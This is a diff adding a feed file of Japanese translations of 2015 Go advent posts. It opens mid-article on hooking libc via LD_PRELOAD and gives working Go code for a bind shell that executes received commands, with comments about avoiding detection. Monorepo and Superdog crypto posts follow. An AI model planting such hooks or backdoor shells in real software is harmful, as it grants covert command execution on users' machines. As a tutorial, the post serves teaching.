+隠すものが無ければ&lt;a href=&#34;https://github.com/chokepoint/azazel/blob/16ca8ac6ed7280e0da73c0f7a166c84ea03ebaa7/azazel.c#L299&#34;&gt;元のlibc関数を呼び出し&lt;/a&gt;、アプリケーションがユーザにとっては正常に動いているように見せかける。&lt;/p&gt;
+
+&lt;p&gt;&lt;code&gt;LD_PRELOAD&lt;/code&gt;を使って他のライブラリにhookすることは昔からある方法で、特にアプリケーションのソースコードにアクセスできない場合にアプリケーショのデバッグに&lt;a href=&#34;https://rafalcieslak.wordpress.com/2013/04/02/dynamic-linker-tricks-using-ld_preload-to-cheat-inject-features-and-investigate-programs/&#34;&gt;使われることがある&lt;/a&gt;。&lt;/p&gt;
+
+&lt;h2 id=&#34;goの中でのcの共有ライブラリ:8928758b80ccd8cb6a9a714a1b35fa0e&#34;&gt;Goの中でのCの共有ライブラリ&lt;/h2&gt;
+
+&lt;p&gt;Go1.5は&lt;code&gt;-buildmode=c-shared&lt;/code&gt;フラグをGoのツールに渡すことでGoのパッケージをCの共有ライブラリにビルドできる&lt;a href=&#34;https://docs.google.com/document/d/1nr-TQHw_er6GOQRsF6T43GGhFDelrAP0NqSS_00RgZQ/edit?pli=1#heading=h.44n2lm20ate5&#34;&gt;新しい実行モジュール&lt;/a&gt;もしくはビルドモードを導入した。&lt;/p&gt;
+
+&lt;p&gt;つまりCの共有ライブラリにコンパイルされたGoのパッケージの関数をGo以外のプログラムが呼び出せるということだ。&lt;/p&gt;
+
+&lt;p&gt;共有ライブラリはGoのツールを使って以下のように作成できる。&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;$ go build -buildmode=c-shared -o library_name.so main.go
+$ file backdoor.so
+backdoor.so: ELF 64-bit LSB  shared object, x86-64, version 1 (SYSV), dynamically linked, BuildID[sha1]=c554a198148f8b50e3c3a99024303f1d8a0cf066, not stripped
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;&lt;code&gt;LD_PRELOAD&lt;/code&gt;環境変数を使うことで、作成した&lt;code&gt;.so&lt;/code&gt;&lt;a href=&#34;http://www.yolinux.com/TUTORIALS/LibraryArchives-StaticAndDynamic.html&#34;&gt;共有オブジェクトファイル&lt;/a&gt;を動的にリンクすることができる。
+例えば以下のように&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;$ LD_PRELOAD=./library_name.so top
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h2 id=&#34;cgo-cからgoまたはその逆の呼び出し:8928758b80ccd8cb6a9a714a1b35fa0e&#34;&gt;cgo: CからGoまたはその逆の呼び出し&lt;/h2&gt;
+
+&lt;p&gt;cgoはGoのパッケージからCのコード呼び出しを可能にし、また、Goの関数をエクスポートしてCのコードからの呼び出しを可能にする。
+より詳しい情報は&lt;a href=&#34;http://blog.golang.org/c-go-cgo&#34;&gt;このブログ記事&lt;/a&gt;を参照。&lt;/p&gt;
+
+&lt;p&gt;CのプログラムからGoの関数が見えるようにするには&lt;a href=&#34;https://golang.org/cmd/cgo/&#34;&gt;cgo&lt;/a&gt;コメントをGoの関数の直上に追加してエクスポートする必要がある。&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-go&#34;&gt;//export FunctionName
+func FunctionName() {...}
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;&lt;code&gt;C&lt;/code&gt;という擬似パッケージのインポートも必要。&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;import &amp;quot;C&amp;quot;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h2 id=&#34;libc関数のオーバライド:8928758b80ccd8cb6a9a714a1b35fa0e&#34;&gt;libc関数のオーバライド&lt;/h2&gt;
+
+&lt;p&gt;libc関数の挙動をオーバライドするには、Goの関数をエクスポートしてCのプログラムから見えるようにする。&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-go&#34;&gt;//export strrchr
+func strrchr(s *C.char, c C.int) *C.char {...}
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;元のlibcの関数と同じシグネチャを持つ必要があることに注意。
+&lt;code&gt;C&lt;/code&gt;擬似パッケージで提供される型を使っているのが分かるだろう。&lt;/p&gt;
+
+&lt;p&gt;関数の中身は元のlibc関数を再実装することもできるが、単に元のlibcの関数を呼び出すだけの方が簡単だろう。
+元のlibcライブラリに動的リンクし、ラッパー関数から元の関数を呼び出すことでこれを行う。&lt;/p&gt;
+
+&lt;p&gt;GitHubに&lt;code&gt;dl&lt;/code&gt;と呼ばれる&lt;a href=&#34;[https://github.com/rainycape/dl&#34;&gt;Goの動的ライブラリローダ&lt;/a&gt;がある。
+&lt;code&gt;dl.Open()&lt;/code&gt;を使ってlibcライブラリを開くことができる。&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-go&#34;&gt;lib, err := dl.Open(&amp;quot;libc&amp;quot;, 0)
+if err != nil {
+        log.Fatalln(err)
+}
+defer lib.Close()
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;そして&lt;code&gt;dl.Sym()&lt;/code&gt;を使ってlibcからポインタにシンボル(今回の場合は関数)を読み込むことができる。
+&lt;code&gt;strrchr&lt;/code&gt;関数のシンボルを&lt;code&gt;old_strrchr&lt;/code&gt;という名前のポインタに読み込む例は以下の通りである。&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-go&#34;&gt;var old_strrchr func(s *C.char, c C.int) *C.char
+lib.Sym(&amp;quot;strrchr&amp;quot;, &amp;amp;old_strrchr)
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;次にラッパー関数の中で元の&lt;code&gt;sttrchr&lt;/code&gt;関数を呼び出して戻り値を返す。
+ラッパー関数全体は以下のようになる。&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-go&#34;&gt;//export strrchr
+func strrchr(s *C.char, c C.int) *C.char {
+        // Code to alter behaviour of original function
+        // goes here
+
+        lib, err := dl.Open(&amp;quot;libc&amp;quot;, 0)
+        if err != nil {
+                log.Fatalln(err)
+        }
+        defer lib.Close()
+
+        var old_strrchr func(s *C.char, c C.int) *C.char
+        lib.Sym(&amp;quot;strrchr&amp;quot;, &amp;amp;old_strrchr)
+
+        return old_strrchr(s, c)
+}
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h2 id=&#34;シンプルなリモートシェルをgoで書く:8928758b80ccd8cb6a9a714a1b35fa0e&#34;&gt;シンプルなリモートシェルをGoで書く&lt;/h2&gt;
+
+&lt;p&gt;libc関数をhookする方法が分かった。
+遊びとしてlibc関数が呼び出された時にポートにバインドして任意のコマンドを受け付けるシンプルなバックドアシェルサーバをGoで書いてみよう。&lt;/p&gt;
+
+&lt;p&gt;今回はHTTP, NNTP, SMTPのようなテキストベースのリクエスト/レスポンスプロトコルをサポートする&lt;code&gt;/net/textproto&lt;/code&gt;パッケージを使ってみよう。&lt;/p&gt;
+
+&lt;p&gt;まずTCPポートを&lt;code&gt;net&lt;/code&gt;パッケージの&lt;code&gt;net.Listen()&lt;/code&gt;を使ってバインドしよう。&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-go&#34;&gt;// Bind to localhost for our example so we don&#39;t inadvertently
+// open ourselves up to an attack over the network
+ln, err := net.Listen(&amp;quot;tcp&amp;quot;, &amp;quot;localhost:4444&amp;quot;)
+if err != nil {
+        return
+}
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;これはコネクションを受け付ける&lt;code&gt;Listener&lt;/code&gt;を提供する。&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-go&#34;&gt;
+for {
+        conn, err := ln.Accept()
+        if err != nil {
+                // Don&#39;t log an error here otherwise we&#39;d reveal the rootkit ;-)
+                continue
+        }
+
+        go handleConnection(conn)
+}
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;コネクションを受け付けるたびにgoroutineの中で&lt;code&gt;handleConnection()&lt;/code&gt;を呼び出すことで複数のコネクションを並行に処理できるようにしている。&lt;/p&gt;
+
+&lt;p&gt;&lt;code&gt;backdoor()&lt;/code&gt;全体は以下のようになる。&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-go&#34;&gt;func backdoor() {
+        ln, err := net.Listen(&amp;quot;tcp&amp;quot;, &amp;quot;localhost:4444&amp;quot;)
+        if err != nil {
+                // Ignore errors to avoid detection
+                return
+        }
+
+        for {
+                conn, err := ln.Accept()
+                if err != nil {
+                        continue
+                }
+
+                go handleConnection(conn)
+        }
+}
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;&lt;code&gt;handleConnection()&lt;/code&gt;の中ではbuffered I/Oリーダを作り、&lt;code&gt;bufio.NewReader()&lt;/code&gt;を使ってコネクションから読み込む。
+そしてbuffred I/Oリーダを&lt;code&gt;textproto.NewReader()&lt;/code&gt;に渡す。これはテキストベースのプロトコルのコネクションからの読み込み用に&lt;code&gt;textproto.ReadLine()&lt;/code&gt;等の便利な関数を提供するものだ。&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-go&#34;&gt;reader := bufio.NewReader(conn)
+tp := textproto.NewReader(reader)
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;そしてコネクションから読み込んだ行を&lt;code&gt;sh&lt;/code&gt;(多くの場合はbash)に渡し、実行結果をコネクションに返す。&lt;/p&gt;
+
+&lt;p&gt;&lt;code&gt;handleConnection()&lt;/code&gt;全体は以下のようになる。&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-go&#34;&gt;
+func handleConnection(conn net.Conn) {
+        reader := bufio.NewReader(conn)
+        tp := textproto.NewReader(reader)
+
+        for {
+                input, err := tp.ReadLine()
+                if err != nil {
+                        log.Println(&amp;quot;Error reading:&amp;quot;, err.Error())
+                        break
+                }
+
+                cmd := exec.Command(&amp;quot;/usr/bin/env&amp;quot;, &amp;quot;sh&amp;quot;, &amp;quot;-c&amp;quot;, input)
+                output, err := cmd.CombinedOutput()
+                if err != nil {
+                        conn.Write([]byte(err.Error() + &amp;quot;\n&amp;quot;))
+                }
+
+                conn.Write(output)
+        }
+
+        conn.Close()
+}
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h2 id=&#34;libc関数が呼ばれた時にリモートシェルを開始する:8928758b80ccd8cb6a9a714a1b35fa0e&#34;&gt;libc関数が呼ばれた時にリモートシェルを開始する&lt;/h2&gt;
+
+&lt;p&gt;対象のアプリケーションがlibc関数を呼びだそうとするたびにリモートシェルを開始してみよう。&lt;/p&gt;
+
+&lt;p&gt;リモートシェルサーバはgoroutineの中で開始するので、元のlibcの関数が呼ばれている間はバックグラウンドで動作し続けることができる。&lt;/p&gt;
+
+&lt;p&gt;シンプルなシグネチャでcgoで実装しやすいので、今回は先に使った&lt;code&gt;strrchr()&lt;/code&gt;libc関数をhookする。
+ルートキットなら&lt;code&gt;fopen()&lt;/code&gt;や&lt;code&gt;stat()&lt;/code&gt;にhookするだろうが、今回は&lt;code&gt;strrchr()&lt;/code&gt;で十分である。&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-go&#34;&gt;//export strrchr
+func strrchr(s *C.char, c C.int) *C.char {
+        // Start remote shell
+        go backdoor()
+
+        lib, err := dl.Open(&amp;quot;libc&amp;quot;, 0)
+        if err != nil {
+                log.Fatalln(err)
+        }
+        defer lib.Close()
+
+        var old_strrchr func(s *C.char, c C.int) *C.char
+        lib.Sym(&amp;quot;strrchr&amp;quot;, &amp;amp;old_strrchr)
+
+        // Call original libc functional and return its return value
+        return old_strrchr(s, c)
+}
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h2 id=&#34;テストしてみよう:8928758b80ccd8cb6a9a714a1b35fa0e&#34;&gt;テストしてみよう&lt;/h2&gt;
+
+&lt;p&gt;Cの共有ライブラリにコンパイルするには、&lt;code&gt;-buildmode&lt;/code&gt;フラグ付きで&lt;code&gt;go build&lt;/code&gt;する。&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;$ go build -buildmode=c-shared -o backdoor.so main.go
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;&lt;code&gt;LD_PRELOAD&lt;/code&gt;環境変数をセットして共有ライブラリを使い、Linuxの&lt;code&gt;top&lt;/code&gt;コマンドを使ったら、リモートシェルに&lt;code&gt;netcat&lt;/code&gt;や&lt;code&gt;telnet&lt;/code&gt;などを使って接続できる。&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;$ LD_PRELOAD=./backdoor.so top
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;pre&gt;&lt;code&gt;# In another terminal
+$ nc localhost 4444
+[...type your commands here...]
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;topのプロセスが生きている限りはコマンドを送ることができるだろう。&lt;/p&gt;
+
+&lt;h2 id=&#34;結論:8928758b80ccd8cb6a9a714a1b35fa0e&#34;&gt;結論&lt;/h2&gt;
+
+&lt;p&gt;ここで紹介したコードは実験的なものではあるが、テキストベースプロトコルを使ってGoでサーバを書くのがいかに簡単か、及び、Cのアプリケーションからgoroutineを開始するなどのGoの共有ライブラリの能力を紹介した。&lt;/p&gt;
+
+&lt;p&gt;完全な&lt;a href=&#34;https://github.com/mattbostock/go-ldpreload-backdoor&#34;&gt;コード例&lt;/a&gt;はGitHubに置いてある。&lt;/p&gt;
+</description>
+    </item>
+    
+    <item>
+      <title>12月8日 - Go in a Monorepo</title>
+      <link>http://localhost:1313/gopheracademy-advent-2015-ja/8-go-in-a-monorepo-ja/</link>
+      <pubDate>Thu, 31 Dec 2015 15:09:31 -0800</pubDate>
+      
+      <guid>http://localhost:1313/gopheracademy-advent-2015-ja/8-go-in-a-monorepo-ja/</guid>
+      <description>
+
+&lt;div class=&#39;note&#39;&gt;※本ポストは&lt;a href=&#34;https://blog.gopheracademy.com/&#34;&gt;Gopher Academy&lt;/a&gt;の&lt;a href=&#34;https://blog.gopheracademy.com/series/advent-2015/&#34;&gt;Advent 2015&lt;/a&gt;の&lt;a href=&#34;https://blog.gopheracademy.com/advent-2015/go-in-a-monorepo/&#34;&gt;12月8日の記事&lt;/a&gt;の日本語訳です。&lt;/div&gt;
+
+&lt;p&gt;&amp;ldquo;monorepo&amp;rdquo;とは多くの異なるプロジェクトやライブラリを含むモノリシックなコードレポジトリである。DigitalOceanでは全てのGoのコード用に&lt;code&gt;cthulhu&lt;/code&gt;というmonorepoを作成した。&lt;code&gt;cthulhu&lt;/code&gt;は我々の内製のGoライブラリ、サービス、ツール及びサードパーティのdependency用の総合的なレポジトリを提供するという目的がある。&lt;/p&gt;
+
+&lt;p&gt;&lt;a href=&#34;https://twitter.com/bryanl&#34;&gt;Bryan Liles&lt;/a&gt;が&lt;code&gt;cthulhu&lt;/code&gt;の&lt;a href=&#34;https://www.digitalocean.com/company/blog/taming-your-go-dependencies/&#34;&gt;ブログポスト&lt;/a&gt;を2015年初めに書いている。
+本ポストでも同じトピックを多くカバーするが、&lt;code&gt;cthulhu&lt;/code&gt;をより良くするためにこの一年行ってきた改善についても述べる。&lt;/p&gt;
+
+&lt;h2 id=&#34;monorepo-structure:e04c8bdeb332a3a711713cc22d300943&#34;&gt;Monorepo Structure&lt;/h2&gt;
+
+&lt;p&gt;&lt;code&gt;cthulhu&lt;/code&gt;は単一のモノリシックなgitレポジトリである。以下のようないくつかの重要なトップレベルのファイルとディレクトリを含んでいる。&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;cthulhu
+├── .drone.yml
+├── analyze.sh
+├── docode/
+│   └── src/
+└── third_party/
+    └── src/
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;.drone.yml&lt;/code&gt;: &lt;a href=&#34;https://drone.io/&#34;&gt;drone&lt;/a&gt;を使ったCIビルド用の設定
+
+&lt;ul&gt;
+&lt;li&gt;自動化されたlintチェックの実行、Goテスト、及びバイナリのビルドと社内のアーティファクトサーバへのアップロードを行う&lt;/li&gt;
+&lt;/ul&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;analyze.sh&lt;/code&gt;: Goのエコシステムで利用可能な素晴らしいツール群を使ったコード解析をCIで行うスクリプト
+
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;goimports&lt;/code&gt;, &lt;code&gt;go vet&lt;/code&gt;, &lt;code&gt;golint&lt;/code&gt;。内製のlintツールもまもなく導入する。&lt;/li&gt;
+&lt;/ul&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;docode/&lt;/code&gt;: &lt;code&gt;$GOPATH&lt;/code&gt;の一部となるもので内製のライブラリ、サービスおよびツールが含まれる。&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;third_party/&lt;/code&gt;: &lt;code&gt;$GOPATH&lt;/code&gt;の一部となるものでサードパーティのdependencyが含まれる。&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;$GOPATHに&lt;code&gt;{CTHULHU}/third_party:{CTHULHU}/docode&lt;/code&gt;を設定することでサードパーティのdependencyを&lt;code&gt;go get&lt;/code&gt;し、内製コードのビルドとテストができる。&lt;/p&gt;
+
+&lt;h2 id=&#34;内製コード:e04c8bdeb332a3a711713cc22d300943&#34;&gt;内製コード&lt;/h2&gt;
+
+&lt;p&gt;全ての内製コードは&lt;code&gt;${CTHULHU}/docode/&lt;/code&gt;に格納されている。このディレクトリ内は異なる目的の4つのディレクトリに分かれている。&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;docode/
+└── src/
+    ├── doge/
+    ├── exp/
+    ├── services/
+    └── tools/
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;doge/&lt;/code&gt;: &lt;strong&gt;D&lt;/strong&gt;igital&lt;strong&gt;O&lt;/strong&gt;cean &lt;strong&gt;G&lt;/strong&gt;o &lt;strong&gt;E&lt;/strong&gt;nvironment: 内製の標準ライブラリ
+
+&lt;ul&gt;
+&lt;li&gt;多くの内製プロジェクトで使われる様々なパッケージ&lt;/li&gt;
+&lt;li&gt;構造化されたkey/valueのロギング&lt;/li&gt;
+&lt;li&gt;APIのアウトプットに応じてリクエストのリトライが可能なHTTPクライアント&lt;/li&gt;
+&lt;li&gt;データベースとの最低限のやり取りを行うレイヤ&lt;/li&gt;
+&lt;li&gt;サービスの状態とメトリクス&lt;/li&gt;
+&lt;/ul&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;exp/&lt;/code&gt;: 新規に追加されたもの(訳注:前回のブログポストからの追加分という意味だと思われる):実験的なコードのホーム
+
+&lt;ul&gt;
+&lt;li&gt;サービスまたはツールがプロダクション環境にデプロイする前の試験場として使われる&lt;/li&gt;
+&lt;li&gt;実験的なコードをまとめてデプロイしないように、CIプロセスの中で作られないアーティファクト&lt;/li&gt;
+&lt;li&gt;masterのrebaseを行い続けるfeatureブランチの苦痛を和らげるために使われる&lt;/li&gt;
+&lt;/ul&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;services/&lt;/code&gt;: DigitalOceanクラウドの重い処理を実行する長期間実行するサービス
+
+&lt;ul&gt;
+&lt;li&gt;典型的にはHTTP APIサーバとクライアント&lt;/li&gt;
+&lt;li&gt;現在開発中のgRPCサービス&lt;/li&gt;
+&lt;/ul&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;tools/&lt;/code&gt;: 有益なアクションを実行する短時間実行されるユーティリティ
+
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;goimports&lt;/code&gt;のfork&lt;/li&gt;
+&lt;li&gt;内製のlintツール&lt;/li&gt;
+&lt;/ul&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h2 id=&#34;サードパーティコード:e04c8bdeb332a3a711713cc22d300943&#34;&gt;サードパーティコード&lt;/h2&gt;
+
+&lt;p&gt;サードパーティのdependencyは&lt;code&gt;${CTHULHU}/third_party/&lt;/code&gt;に格納される。このディレクトリは&lt;code&gt;$GOPATH&lt;/code&gt;の中で&lt;code&gt;${CTHULHU}/docode/&lt;/code&gt;の前なのでdependencyを&lt;code&gt;go get&lt;/code&gt;するだけでレポジトリに追加できる。&lt;/p&gt;
+
+&lt;p&gt;git submoduleを使わなければいけなくなる問題を避けるために、レポジトリにコミットする前に&lt;code&gt;.git&lt;/code&gt;ディレクトリを&lt;code&gt;.checkout_git&lt;/code&gt;にリネームしている。
+ベンダリングしたdependencyをアップデートしたい場合は再度ディレクトリを&lt;code&gt;.git&lt;/code&gt;にリネームして最新の変更をpullする。おそらくより良いアプローチがあるだろうが、滅多にサードバーティのdepenencyのバージョンを変えたりはしないので、今のところ上手く行っている。&lt;/p&gt;
+
+&lt;h2 id=&#34;monorepoの利点:e04c8bdeb332a3a711713cc22d300943&#34;&gt;Monorepoの利点&lt;/h2&gt;
+
+&lt;p&gt;&lt;code&gt;cthulhu&lt;/code&gt;のアイデアが&lt;a href=&#34;https://twitter.com/AntoineGrondin&#34;&gt;Antoine Grondin&lt;/a&gt;によって提案された当初は懐疑的だった。しかしmonorepoを数週間使ってみると、Goの開発者のチームでは最も良い方法だと確信した。&lt;/p&gt;
+
+&lt;p&gt;Goのエコシステムの素晴らしいツールの数々はmonorepoで使われるとより良いものになる。例えば&lt;code&gt;gorename&lt;/code&gt;は信じられないくらい便利だ。
+つい最近全てのレポジトリ内のソースファイル内で&lt;code&gt;foo.FooDB&lt;/code&gt;から&lt;code&gt;foo.DB&lt;/code&gt;にリネームすることができた。このようにまとめてリファクタリングできるというのは大変素晴らしいものである。
+あらゆる変更は全ての内製のGoプロジェクトに渡ってコンパイル・テストされる。&lt;/p&gt;
+
+&lt;p&gt;最近、CIビルド中に&lt;code&gt;analyze.sh&lt;/code&gt;を使って様々な自動lintチェックを実行する実験を始めた。
+全てのコードが&lt;code&gt;cthulhu&lt;/code&gt;内にあるので&lt;code&gt;gofmt&lt;/code&gt;や&lt;code&gt;go vet&lt;/code&gt;等を満たさないようなコードが入るとビルドを失敗させることができる。
+さらに、標準ライブラリの&lt;code&gt;go/ast&lt;/code&gt;という素晴らしいパッケージを使った内製のlintツールに取り組んでいる。
+その内の一つは&lt;code&gt;explint&lt;/code&gt;と呼ばれているが、これは実験的な&lt;code&gt;exp/&lt;/code&gt;ディレクトリ内のコードがプロダクション用の&lt;code&gt;services/&lt;/code&gt;や&lt;code&gt;tools/&lt;/code&gt;内の他のコードからimportされていないことを保証するものである。&lt;/p&gt;
+
+&lt;p&gt;最後に、monorepoはサードバーティのdependencyをベンダリングする際の問題を解決してくれる。
+&lt;code&gt;cthulhu&lt;/code&gt;の全てのプロジェクトは同じバージョンのサードバーティライブラリを使用する。そしてライブラリのバージョンが上がった場合は、それを利用する全てのプロジェクトが自動的にビルド及びテストされる。
+最近、&lt;code&gt;$GO15VENDOREXPERIMENT=1&lt;/code&gt;を試してみたが、残念ながら&lt;code&gt;goimports&lt;/code&gt;で問題があり、元に戻さなければならなかった。&lt;code&gt;goimports&lt;/code&gt;が&lt;a href=&#34;https://github.com/golang/go/issues/12278&#34;&gt;アップデートされたら&lt;/a&gt;再度挑戦したい。&lt;/p&gt;
+
+&lt;h2 id=&#34;monorepoの欠点:e04c8bdeb332a3a711713cc22d300943&#34;&gt;Monorepoの欠点&lt;/h2&gt;
+
+&lt;p&gt;我々のケースではmonorepoを使う利点がコストを上回るが、常に良い方法ではない。&lt;/p&gt;
+
+&lt;p&gt;&lt;code&gt;cthulhu&lt;/code&gt;が成長するにつれ、CIテストの時間も増大する。
+毎日プロジェクトやテストが追加されていてそれらの中にはデータベースのテストを必要とするものもある。
+Russ Coxによる&lt;a href=&#34;https://github.com/rsc/gt&#34;&gt;gt&lt;/a&gt;を試してはみたがまだ&lt;code&gt;cthulhu&lt;/code&gt;に採用はされていない。&lt;/p&gt;
+
+&lt;p&gt;monorepoは多くのプロジェクトへのコミットが日々あるので、featureブランチがすぐに昔のものになってしまうことがある。
+だから我々はfeatureブランチに実験的なコードを持つのではなく、&lt;code&gt;exp/&lt;/code&gt;ディレクトリを採用した。
+&lt;code&gt;exp/&lt;/code&gt;は今のところ上手く行っているが&lt;code&gt;exp/&lt;/code&gt;からプロダクション用の&lt;code&gt;services/&lt;/code&gt;や&lt;code&gt;tools/&lt;/code&gt;に移すときのガイドラインは検討中だ。&lt;/p&gt;
+
+&lt;p&gt;先述したとおり、サードバーティの&lt;code&gt;.git&lt;/code&gt;ディレクトリはgit submoduleではなくリネームしている。これは理想的な方法とは言えないが、今のところサードバーティのコードに触れることは稀なので上手く行っている。&lt;/p&gt;
+
+&lt;h2 id=&#34;サマリ:e04c8bdeb332a3a711713cc22d300943&#34;&gt;サマリ&lt;/h2&gt;
+
+&lt;p&gt;DigitalOceanのmonorepoである&lt;code&gt;cthulhu&lt;/code&gt;を使った開発体験は私にとって今までで最も心地よいものの1つになっている。
+複数のレポジトリでdependencyを最新に保つ方法よりは遥かに上手くいっている。
+実験的なプロダクションを壊す心配をせずに、Goのエコシステムの素晴らしいツールを使って大規模なリファクタリングを可能にしてくれる。&lt;/p&gt;
+
+&lt;p&gt;monorepoに関して質問や詳細が知りたかったら&lt;a href=&#34;https://gophers.slack.com/&#34;&gt;Gophers Slack&lt;/a&gt;のmdlayherに聞いて欲しい。&lt;/p&gt;
+</description>
+    </item>
+    
+    <item>
+      <title>12月6日 - Smart Cryptography with Superdog and Vault</title>
+      <link>http://localhost:1313/gopheracademy-advent-2015-ja/6-superdog-ja/</link>
+      <pubDate>Thu, 31 Dec 2015 15:09:26 -0800</pubDate>
+      
+      <guid>http://localhost:1313/gopheracademy-advent-2015-ja/6-superdog-ja/</guid>
+      <description>
+
+&lt;div class=&#39;note&#39;&gt;※本ポストは&lt;a href=&#34;https://blog.gopheracademy.com/&#34;&gt;Gopher Academy&lt;/a&gt;の&lt;a href=&#34;https://blog.gopheracademy.com/series/advent-2015/&#34;&gt;Advent 2015&lt;/a&gt;の&lt;a href=&#34;https://blog.gopheracademy.com/advent-2015/superdog/&#34;&gt;12月6日の記事&lt;/a&gt;の日本語訳です。&lt;/div&gt;
+
+&lt;h2 id=&#34;superdog-the-crypto-library-for-vault-from-hashicorp:1fce78842ee22ab0726cd2d4dbda0bd4&#34;&gt;Superdog - the Crypto library for Vault from Hashicorp&lt;/h2&gt;
+
+&lt;p&gt;&lt;a href=&#34;http://xor.exchange/&#34;&gt;XOR Data Exchange&lt;/a&gt;において多くの顧客の機密データに対する取り組みを論じた。我々にはシンプルかつ実用的な方法で鍵のローテーションを行う強度な暗号化をサポートする必要があった。
+そのため&lt;code&gt;superdog&lt;/code&gt;というものを書いた。Superdogは開発及びテスト環境での強固な暗号をサポートするライブラリだ。
+&lt;a href=&#34;https://github.com/xordataexchange/superdog&#34;&gt;Superdog&lt;/a&gt;は&lt;a href=&#34;https://www.vaultproject.io/&#34;&gt;Vault&lt;/a&gt;のAPIのラッパーになっており、&lt;code&gt;keyProvider&lt;/code&gt;インターフェースを実装するコードを使って暗号鍵の管理を行うことができる。
+&lt;code&gt;keyProvider&lt;/code&gt;インターフェースの実装はVault用に提供されているが、他のものもサポートできるだろう。&lt;/p&gt;
+
+&lt;p&gt;Vaultを利用することで鍵と暗号文をセキュアかつ強固に分離することができる。
+Vaultのインスタンスが利用可能かに関わらず開発・テスト・ステージング環境での暗号化のルーチンを利用できるようにすることで、Superdogはこの分離をさらに一歩先に進めている。
+この抽象化は&lt;code&gt;keyProvider&lt;/code&gt;インターフェースを使って提供される。デフォルトでは&lt;code&gt;DevKeyProvider&lt;/code&gt;が使われる。DevKeyProviderは同じ鍵と初期化ベクトル(IV)を使う安全ではないプロバイダである。
+プロダクション環境では絶対に使うべきではない。&lt;/p&gt;
+
+&lt;h2 id=&#34;機能:1fce78842ee22ab0726cd2d4dbda0bd4&#34;&gt;機能&lt;/h2&gt;
+
+&lt;ul&gt;
+&lt;li&gt;鍵のバージョン管理- 鍵のバージョンは暗号文の最初の数バイトに保存される&lt;/li&gt;
+&lt;li&gt;鍵のローテーション - 古いバージョンの復号が常に可能な安全な鍵のローテーション&lt;/li&gt;
+&lt;li&gt;テストやローカルの開発用の実装&lt;/li&gt;
+&lt;li&gt;バージョン管理されローテートされたIVおよびSalt - &lt;code&gt;SaltProvider&lt;/code&gt;インターフェースは&lt;code&gt;KeyProvider&lt;/code&gt;と同様、開発及びテストで鍵用のサーバ(Vault)無しで暗号ライブラリへのアクセスを可能にする&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;Reencrypt&lt;/code&gt;関数は鍵のローテーションをシンプルにし、与えられた鍵での復号と最新の鍵での再暗号化を行う&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h2 id=&#34;cypher-suites:1fce78842ee22ab0726cd2d4dbda0bd4&#34;&gt;Cypher Suites&lt;/h2&gt;
+
+&lt;p&gt;&lt;code&gt;superdog&lt;/code&gt;はCFB/CTR/GCM/OFBモードのAES暗号をサポートする。&lt;/p&gt;
+
+&lt;h2 id=&#34;パフォーマンス:1fce78842ee22ab0726cd2d4dbda0bd4&#34;&gt;パフォーマンス&lt;/h2&gt;
+
+&lt;p&gt;Go version 1.5.2 / Linux x86_64 kernel 4.2.5 on a quad-core i7という環境で以下の通り。&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;BenchmarkKeyEncryptCFB-8	 1000000	      2024 ns/op
+BenchmarkKeyEncryptCTR-8	  500000	      2748 ns/op
+BenchmarkKeyEncryptGCM-8	 1000000	      2381 ns/op
+BenchmarkKeyEncryptOFB-8	  500000	      2665 ns/op
+BenchmarkKeyDecryptCFB-8	10000000	       215 ns/op
+BenchmarkKeyDecryptCTR-8	 2000000	       898 ns/op
